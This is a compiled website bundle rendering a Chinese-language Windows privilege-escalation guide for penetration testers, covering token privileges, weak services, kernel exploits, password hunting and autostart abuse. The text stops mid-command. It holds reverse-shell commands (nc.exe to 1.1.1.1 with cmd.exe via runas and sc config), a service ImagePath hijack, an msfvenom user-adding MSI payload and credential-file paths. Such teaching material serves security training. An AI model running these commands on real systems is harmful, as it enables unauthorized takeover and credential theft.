"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[391],{28453:(n,e,s)=>{s.d(e,{R:()=>r,x:()=>c});var i=s(96540);const l={},d=i.createContext(l);function r(n){const e=i.useContext(d);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(l):n.components||l:r(n.components),i.createElement(d.Provider,{value:e},n.children)}},87268:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>h,contentTitle:()=>c,default:()=>x,frontMatter:()=>r,metadata:()=>i,toc:()=>t});const i=JSON.parse('{"id":"\u6e17\u900f/Windows \u63d0\u6743/Windows \u63d0\u6743\u6307\u5357","title":"Windows \u63d0\u6743\u6307\u5357","description":"\u7537\u513f\u82e5\u9042\u5e73\u751f\u5fd7\uff0c\u4e94\u7ecf\u52e4\u5411\u7a97\u524d\u8bfb\u3002","source":"@site/docs/\u6e17\u900f/Windows \u63d0\u6743/Windows \u63d0\u6743\u6307\u5357.md","sourceDirName":"\u6e17\u900f/Windows \u63d0\u6743","slug":"/\u6e17\u900f/Windows \u63d0\u6743/Windows \u63d0\u6743\u6307\u5357","permalink":"/docs/\u6e17\u900f/Windows \u63d0\u6743/Windows \u63d0\u6743\u6307\u5357","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"Windows \u63d0\u6743","permalink":"/docs/category/windows-\u63d0\u6743"},"next":{"title":"Windows \u63d0\u6743-\u624b\u5de5\u679a\u4e3e","permalink":"/docs/\u6e17\u900f/Windows \u63d0\u6743/Windows \u63d0\u6743-\u624b\u5de5\u679a\u4e3e"}}');var l=s(74848),d=s(28453);const r={sidebar_position:2},c=void 0,h={},t=[{value:"\u5bfc\u822a",id:"\u5bfc\u822a",level:2},{value:"<div>\u58f9 - Se \u7279\u6743</div>",id:"\u58f9---se-\u7279\u6743",level:2},{value:"<div>\u8d30 - RunAs</div>",id:"\u8d30---runas",level:2},{value:"<div>\u53c1 - \u5f31\u670d\u52a1</div>",id:"\u53c1---\u5f31\u670d\u52a1",level:2},{value:"<div>\u8086 - Windows \u5185\u6838</div>",id:"\u8086---windows-\u5185\u6838",level:2},{value:"<div>\u4f0d - \u5bc6\u7801\u641c\u5bfb</div>",id:"\u4f0d---\u5bc6\u7801\u641c\u5bfb",level:2},{value:"<div>\u9646 - \u6742\u9879</div>",id:"\u9646---\u6742\u9879",level:2},{value:"<div>1\u3001AlwaysInstallElevated</div>",id:"1alwaysinstallelevated",level:4},{value:"<div>2\u3001\u5f00\u673a\u81ea\u542f</div>",id:"2\u5f00\u673a\u81ea\u542f",level:4},{value:"<div>\u67d2 - \u670d\u52a1\u7a0b\u5e8f</div>",id:"\u67d2---\u670d\u52a1\u7a0b\u5e8f",level:2},{value:"<div>1\u3001MSSQL</div>",id:"1mssql",level:4},{value:"<div>2\u3001MySQL UDF</div>",id:"2mysql-udf",level:4},{value:"<div>3\u3001PrintNightmare</div>",id:"3printnightmare",level:4},{value:"<div>4\u3001\u4e0d\u5b89\u5168\u7684 GUI \u7a0b\u5e8f</div>",id:"4\u4e0d\u5b89\u5168\u7684-gui-\u7a0b\u5e8f",level:4},{value:"<div>\u634c - \u81ea\u52a8\u5316\u5de5\u5177</div>",id:"\u634c---\u81ea\u52a8\u5316\u5de5\u5177",level:2}];function o(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h4:"h4",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,d.R)(),...n.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsxs)(e.blockquote,{children:["\n",(0,l.jsx)(e.p,{children:"\u7537\u513f\u82e5\u9042\u5e73\u751f\u5fd7\uff0c\u4e94\u7ecf\u52e4\u5411\u7a97\u524d\u8bfb\u3002"}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\u5bfc\u822a",children:"\u5bfc\u822a"}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id1",children:"\u58f9 - Se \u7279\u6743"})}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id2",children:"\u8d30 - RunAs"})}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id3",children:"\u53c1 - \u5f31\u670d\u52a1"})}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id4",children:"\u8086 - Windows \u5185\u6838"})}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id5",children:"\u4f0d - \u5bc6\u7801\u641c\u5bfb"})}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id6",children:"\u9646 - \u6742\u9879"})}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"#id6.1",children:"AlwaysInstallElevated"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"#id6.2",children:"\u5f00\u673a\u81ea\u542f"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id7",children:"\u67d2 - \u670d\u52a1\u7a0b\u5e8f"})}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"#id7.1",children:"MSSQL"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"#id7.2",children:"MySQL UDF"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"#id7.3",children:"PrintNightmare"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"#id7.4",children:"\u4e0d\u5b89\u5168\u7684 GUI \u7a0b\u5e8f"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.a,{href:"#id8",children:"\u634c - \u81ea\u52a8\u5316\u5de5\u5177"})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\u58f9---se-\u7279\u6743",children:(0,l.jsx)("div",{id:"id1",children:"\u58f9 - Se \u7279\u6743"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u62e5\u6709\u611f\u5174\u8da3\u7684 ",(0,l.jsx)(e.strong,{children:"Se \u7279\u6743"}),"\uff0c\u5982 SeImpersonatePrivilege/SeAssignPrimaryPrivilege\u3001SeBackupPrivilege\u3001SeRestorePrivilege/SeTakeOwnershipPrivilege \u7b49\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:"whoami /priv"})," \u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u82e5\u62e5\u6709 ",(0,l.jsx)(e.strong,{children:"SeImpersonatePrivilege"})," \u7279\u6743\uff0c\u5219\u5c55\u5f00\u571f\u8c46\u63d0\u6743\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18738762",children:"\u5229\u7528\u65b9\u6cd5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u82e5\u62e5\u6709 ",(0,l.jsx)(e.strong,{children:"SeBackupPrivilege"})," \u7279\u6743\uff0c\u5219\u9700\u5148\u8fdb\u884c SAM/SYSTEM \u6587\u4ef6\u63d0\u53d6\uff0c\u7136\u540e\u5f00\u59cb PTH \u653b\u51fb\u63d0\u6743\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18741609",children:"\u5229\u7528\u65b9\u6cd5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u81f3\u4e8e\u5176\u5b83\u7279\u6743\u6240\u62e5\u6709\u7684\u53ef\u5229\u7528\u7279\u6027\uff0c\u53ef\u6839\u636e\u6b64",(0,l.jsx)(e.a,{href:"https://github.com/gtworek/Priv2Admin",children:"\u4ed3\u5e93"}),"\u5185\u5bb9\u8fdb\u884c\u7814\u7a76\u63a2\u7d22\u3002"]}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\u8d30---runas",children:(0,l.jsx)("div",{id:"id2",children:"\u8d30 - RunAs"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u68c0\u67e5\u5f53\u524d\u73af\u5883\u662f\u5426\u62e5\u6709\u4efb\u4f55",(0,l.jsx)(e.strong,{children:"\u5b58\u50a8\u7684\u51ed\u8bc1"}),"\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:"cmdkey /list"})," \u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u82e5",(0,l.jsx)(e.strong,{children:"\u53d1\u73b0\u51ed\u8bc1"}),"\uff0c\u5219\u53ef\u4f7f\u7528 ",(0,l.jsx)(e.code,{children:'runas /env /noprofile /savecred /user:admin "c:\\temp\\nc.exe 1.1.1.1 443 -e cmd.exe"'})," \u6765\u8fdb\u884c\u6743\u9650\u79fb\u52a8\u3002"]}),"\n",(0,l.jsxs)(e.li,{children:["\u82e5\u901a\u8fc7\u4e0b\u6587\u7684\u5bc6\u7801\u641c\u5bfb\u83b7\u5f97\u4e86",(0,l.jsx)(e.strong,{children:"\u7528\u6237\u7684\u5bc6\u7801\u4fe1\u606f"}),"\uff0c\u5219\u53ef\u53c2\u8003\u8be5",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18751119#id2",children:"\u6587\u7ae0"}),"\u8fdb\u884c\u6743\u9650\u79fb\u52a8\u3002"]}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\u53c1---\u5f31\u670d\u52a1",children:(0,l.jsx)("div",{id:"id3",children:"\u53c1 - \u5f31\u670d\u52a1"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u5f31\u670d\u52a1\u7684\u679a\u4e3e\u6700\u597d\u8fd8\u662f\u901a\u8fc7\u5de5\u5177 ",(0,l.jsx)(e.a,{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",children:"PowerUp"})," \u548c ",(0,l.jsx)(e.a,{href:"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS",children:"winPEAS"})," \u53bb\u81ea\u52a8\u5206\u6790\uff0c\u624b\u5de5\u5206\u6790\u8f83\u4e3a\u7e41\u7410\u3002\u5f31\u670d\u52a1\u7c7b\u522b\u5982\u4e0b\uff1a"]}),"\n",(0,l.jsxs)(e.li,{children:["\u5f31",(0,l.jsx)(e.strong,{children:"\u670d\u52a1"}),"\u6743\u9650\uff1a\u7528\u6237\u5bf9\u670d\u52a1\u81ea\u8eab\u5177\u6709\u4fee\u6539\u6743\u9650\uff0c\u6545\u53ef\u901a\u8fc7 sc \u547d\u4ee4\u4fee\u6539\u670d\u52a1\u7684\u542f\u52a8\u7a0b\u5e8f\u8def\u5f84\u6216\u670d\u52a1\u542f\u52a8\u8eab\u4efd\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:'sc config Juggernaut binPath= "C:\\temp\\nc.exe 1.1.1.1 443 -e C:\\windows\\system32\\cmd.exe"'})," \u3011\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18779558#id4",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u5f31",(0,l.jsx)(e.strong,{children:"\u6ce8\u518c\u8868"}),"\u6743\u9650\uff1a\u7528\u6237\u5bf9\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u6ce8\u518c\u8868\u5177\u6709\u5199\u5165\u6743\u9650\uff0c\u6545\u53ef\u901a\u8fc7 reg \u547d\u4ee4",(0,l.jsx)(e.strong,{children:"\u95f4\u63a5\u4fee\u6539"}),"\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u8def\u5f84\u6216\u670d\u52a1\u542f\u52a8\u8eab\u4efd\u7684\u52a8\u4f5c\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Juggernaut" /v ImagePath /t REG_EXPAND_SZ /d "C:\\temp\\shell.exe" /f'}),"\u3011\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18785725#id3",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u5f31",(0,l.jsx)(e.strong,{children:"\u6587\u4ef6/\u76ee\u5f55"}),"\u6743\u9650\uff1a\u7528\u6237\u5bf9\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u6240\u5728\u76ee\u5f55\u5177\u6709\u5199\u5165\u6743\u9650\uff0c\u6545\u53ef\u5bf9\u542f\u52a8\u7a0b\u5e8f\u8fdb\u884c\u66ff\u6362\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18771857#id4",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\u672a\u5f15\u7528"}),"\u7684\u670d\u52a1\u8def\u5f84\uff1a\uff081\uff09\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u7684\u7edd\u5bf9\u8def\u5f84\u5b58\u5728\u7a7a\u683c\u4e14\u6ca1\u6709\u4f7f\u7528\u53cc\u5f15\u53f7\u5305\u88f9\uff0c\u89e6\u53d1\u7cfb\u7edf\u6309\u7167",(0,l.jsx)(e.strong,{children:"\u8def\u5f84\u4f18\u5148\u7ea7"}),"\u9010\u5c42\u67e5\u627e\u53ef\u6267\u884c\u6587\u4ef6\u3002\uff082\uff09\u5728\u9010\u5c42\u67e5\u627e\u7684\u8def\u5f84\u4e2d\uff0c\u7528\u6237\u5bf9\u5176\u4e2d\u4e00\u4e2a\u76ee\u5f55\u5177\u6709\u5199\u5165\u6743\u9650\u3002\uff083\uff09\u4f9d\u6b64\u5728\u76ee\u5f55\u4e0b\u5199\u5165\u4e00\u4e2a ",(0,l.jsx)(e.strong,{children:"\u5bf9\u5e94\u540d\u79f0"})," \u7684\u6076\u610f\u7a0b\u5e8f\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18779548#id1",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"DLL"})," \u52ab\u6301\uff1a\u7c7b\u4f3c\u201c\u5f31",(0,l.jsx)(e.strong,{children:"\u6587\u4ef6/\u76ee\u5f55"}),"\u6743\u9650\u201d\u4e2d\u66ff\u6362\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u4e00\u6837\uff0cDLL \u52ab\u6301\u4f1a\u5bf9\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u6240\u52a0\u8f7d\u7684 DLL \u6587\u4ef6\u8fdb\u884c\u76f4\u63a5\u66ff\u6362\u6216\u95f4\u63a5\u52ab\u6301\u3002","\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\u76f4\u63a5\u66ff\u6362"}),"\u8981\u6c42\u7528\u6237\u5bf9\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u6240\u5728\u76ee\u5f55\u5177\u6709\u5199\u5165\u6743\u9650\u3002\u3010\u6ce8\uff1a\u65e2\u5982\u6b64\uff0c\u4f55\u4e0d\u76f4\u63a5\u66ff\u6362\u542f\u52a8\u7a0b\u5e8f\u3011\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18782860#id2",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\u95f4\u63a5\u52ab\u6301"}),"\u9700\u8981\u5206\u6790\u670d\u52a1\u542f\u52a8\u65f6\u4f1a\u52a0\u8f7d\u54ea\u4e9b DLL\uff0c\u540c\u65f6\u9700\u8981\u5bf9 ",(0,l.jsx)(e.strong,{children:"DLL \u6807\u51c6\u641c\u7d22\u76ee\u5f55"}),"\u5176\u4e2d\u4e4b\u4e00\u5177\u6709\u5199\u5165\u6743\u9650\u3002\u3010\u6ce8\uff1a\u8fd9\u79cd\u53ea\u5bf9\u5df2\u77e5\u901a\u7528\u7684\u670d\u52a1\u6709\u6548\u679c\u3011\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18782860#id3",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u4e00\u4e9b\u5229\u7528\u7cfb\u7edf DLL \u52a0\u8f7d\u8fdb\u884c\u653b\u51fb\u7684\u4ed3\u5e93\u63a8\u8350\uff1a","\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/xct/diaghub",children:"https://github.com/xct/diaghub"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/itm4n/UsoDllLoader",children:"https://github.com/itm4n/UsoDllLoader"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/sailay1996/WerTrigger",children:"https://github.com/sailay1996/WerTrigger"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.blockquote,{children:["\n",(0,l.jsx)(e.p,{children:"\u6ce8\u610f\uff1a\u5728\u5bf9\u670d\u52a1\u8fdb\u884c\u5229\u7528\u4e4b\u524d\uff0c\u5148\u77e5\u6089\u81ea\u5df1\u6709\u6ca1\u6709\u89e6\u53d1\u670d\u52a1\u91cd\u542f\u7684\u80fd\u529b\uff08\u91cd\u542f\u670d\u52a1[sc start *]\u3001\u91cd\u542f\u7535\u8111\uff09\uff0c\u5426\u5219\u505a\u4e86\u4e5f\u662f\u65e0\u7528\u5de5\u3002"}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\u8086---windows-\u5185\u6838",children:(0,l.jsx)("div",{id:"id4",children:"\u8086 - Windows \u5185\u6838"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsxs)(e.p,{children:["\u67e5\u770b OS \u7248\u672c\u4fe1\u606f\uff0c\u786e\u8ba4 Windows \u7684\u65b0\u65e7\u7248\u672c\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:"systeminfo"})," \u3011"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"Windows XP/7/Server 2008/Server 2012/\u5176\u5b83\u66f4\u65e7\u7248\u672c"})," \u90fd\u79f0\u4e3a\u65e7\u7248 Windows \u7cfb\u7edf\u3002\u65e7\u7248 Windows \u7cfb\u7edf\u53ef\u5c06 systeminfo.txt \u5185\u5bb9\u4ea4\u7ed9\u81ea\u52a8\u5de5\u5177 ",(0,l.jsx)(e.a,{href:"https://github.com/bitsadmin/wesng",children:"wesng"})," \u548c ",(0,l.jsx)(e.a,{href:"https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2",children:"Windows Exploit Suggester 2"})," \u53bb\u79bb\u7ebf\u5206\u6790\uff0c\u6216\u5728\u53d7\u5bb3\u673a\u672c\u673a\u4f7f\u7528 ",(0,l.jsx)(e.a,{href:"https://github.com/rasta-mouse/Sherlock",children:"sherlock.ps1"})," \u811a\u672c\u53bb\u5206\u6790\uff0c\u5206\u6790\u7ed3\u679c\u4e2d\u4ea4\u96c6\u7684\u6f0f\u6d1e\u53ef\u4f18\u5148\u5b9e\u9a8c\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18765857",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"Windows 10/Server 2016/Server 2019/ \u5176\u5b83\u66f4\u65b0\u7248\u672c"})," \u90fd\u79f0\u4e3a\u65b0\u7248 Windows \u7cfb\u7edf\u3002\u65b0\u7248 Windows \u7cfb\u7edf\u5efa\u8bae\u4f7f\u7528\u81ea\u52a8\u5de5\u5177 ",(0,l.jsx)(e.a,{href:"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS",children:"winPEAS"}),"\u53bb\u53d7\u5bb3\u673a\u672c\u5730\u5206\u6790\uff0c\u6216\u901a\u8fc7 kali \u5185\u7f6e\u5de5\u5177 ",(0,l.jsx)(e.strong,{children:"Searchsploit"})," \u53bb\u79bb\u7ebf\u624b\u5de5\u67e5\u627e\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18768236",children:"\u66f4\u591a\u8be6\u60c5"}),"\u3011"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsxs)(e.p,{children:["\u4f18\u8d28\u5185\u6838\u6f0f\u6d1e\u5229\u7528",(0,l.jsx)(e.strong,{children:"\u63a8\u8350"}),"\uff1a"]}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.a,{href:"https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527",children:"PrintNightmare"}),"\uff1a\u51e0\u4e4e\u6240\u6709\u53d7\u652f\u6301\u7684 Windows \u7248\u672c\u3002"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.a,{href:"https://github.com/KaLendsi/CVE-2022-21882",children:"cve_2022_21882_win32k"}),"\u3010MSF \u4ea6\u652f\u6301\u3011\uff1a\u51e0\u4e4e\u8986\u76d6 Win10 \u6240\u6709\u7248\u672c\u3002"]}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/SecWiki/windows-kernel-exploits",children:"\u5176\u5b83\u5df2\u7f16\u8bd1\u7684\u5185\u6838\u6f0f\u6d1e"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.blockquote,{children:["\n",(0,l.jsx)(e.p,{children:"\u6ce8\u610f\uff1aWindows \u5185\u6838\u6f0f\u6d1e\u7684\u4f17\u591a\u5229\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6709\u4e00\u4e9b\u662f\u9700\u8981\u5728 GUI \u73af\u5883\u624d\u80fd\u591f\u6b63\u5e38\u4f7f\u7528\u7684\uff0c\u8fd9\u4e00\u70b9\u9700\u7279\u522b\u6ce8\u610f\u3002"}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\u4f0d---\u5bc6\u7801\u641c\u5bfb",children:(0,l.jsx)("div",{id:"id5",children:"\u4f0d - \u5bc6\u7801\u641c\u5bfb"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u65e0\u4eba\u503c\u5b88\u6587\u4ef6\u5e38\u89c1\u8def\u5f84\uff0c\u5982\u4e0b\uff1a","\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.code,{children:"C:\\unattend.xml"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.code,{children:"C:\\Windows\\Panther\\Unattend.xml"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.code,{children:"C:\\Windows\\Panther\\Unattend\\Unattend.xml"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.code,{children:"C:\\Windows\\system32\\sysprep.xml"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.code,{children:"C:\\Windows\\system32\\sysprep\\sysprep.xml"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\u7528\u6237\u5bb6\u76ee\u5f55\u4e2d\u7684 ",(0,l.jsx)(e.code,{children:"*.* "})," \u6587\u4ef6 \u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:"dir /s /b c:\\users\\ | findstr .*\\..*"})," \u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["PowerShell \u5386\u53f2\u6587\u4ef6","\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.code,{children:"type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.code,{children:"cat (Get-PSReadlineOption).HistorySavePath"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["IIS \u914d\u7f6e\u548c Web \u6587\u4ef6","\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:'Get-Childitem -Recurse C:\\inetpub | findstr -i "directory config txt aspx ps1 bat xml pass user"'}),"  \u7ed3\u679c\u4e2d\u7684 web.config\u3001connectionstrings.config \u6587\u4ef6\uff0c\u6216\u7c7b\u4f3c\u7684 config \u6587\u4ef6\u3002"]}),"\n",(0,l.jsxs)(e.li,{children:["\u9664\u4e86 IIS \u9ed8\u8ba4\u4f7f\u7528\u7684 ",(0,l.jsx)(e.code,{children:"C:\\inetpub"})," \u76ee\u5f55\u5916\uff0c\u8fd8\u6709\u8fd9\u4e9b\u76ee\u5f55\u503c\u5f97\u6ce8\u610f\uff1a",(0,l.jsx)(e.code,{children:"C:\\apache"}),"\u3001",(0,l.jsx)(e.code,{children:"C:\\nginx"}),"\u3001",(0,l.jsx)(e.code,{children:"C:\\xampp"}),"\u3001",(0,l.jsx)(e.code,{children:"C:\\wamp"}),"\u3002"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\u82e5\u80fd\u591f\u767b\u5f55 SQL \u6570\u636e\u5e93\uff0c\u5219\u904d\u5386 ",(0,l.jsx)(e.strong,{children:"\u7cfb\u7edf\u5185\u7f6e\u5e93/\u7528\u6237\u81ea\u5efa\u5e93"})," \u4e2d\u7528\u6237\u8868\u4e2d\u7684\u8d26\u6237\u5bc6\u7801\u3002"]}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\u9646---\u6742\u9879",children:(0,l.jsx)("div",{id:"id6",children:"\u9646 - \u6742\u9879"})}),"\n",(0,l.jsx)(e.h4,{id:"1alwaysinstallelevated",children:(0,l.jsx)("div",{id:"id6.1",children:"1\u3001AlwaysInstallElevated"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsx)(e.p,{children:"\u68c0\u67e5 AlwaysInstallElevated \u529f\u80fd\u662f\u5426\u5f00\u542f\u3002\u3010\u503c\u4e3a 1 \u8868\u793a\u529f\u80fd\u5df2\u542f\u7528\u3011"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-cmd",children:"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\r\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"})}),"\n"]}),"\n",(0,l.jsxs)(e.li,{children:["\n",(0,l.jsxs)(e.p,{children:["\u5236\u4f5c\u8f7d\u8377 ",(0,l.jsx)(e.code,{children:"msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi"})]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(e.h4,{id:"2\u5f00\u673a\u81ea\u542f",children:(0,l.jsx)("div",{id:"id6.2",children:"2\u3001\u5f00\u673a\u81ea\u542f"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u81ea\u542f\u5e94\u7528-\u76ee\u5f55\uff1a",(0,l.jsx)(e.code,{children:'icacls "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'}),"\u3010\u6709\u5199\u6743\u9650\u65f6\uff0c\u5c06\u7a0b\u5e8f\u6216 bat \u653e\u5165\u5373\u53ef\u3002\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u81ea\u542f\u5e94\u7528-\u6ce8\u518c\u8868\uff1a",(0,l.jsx)(e.code,{children:'reg query 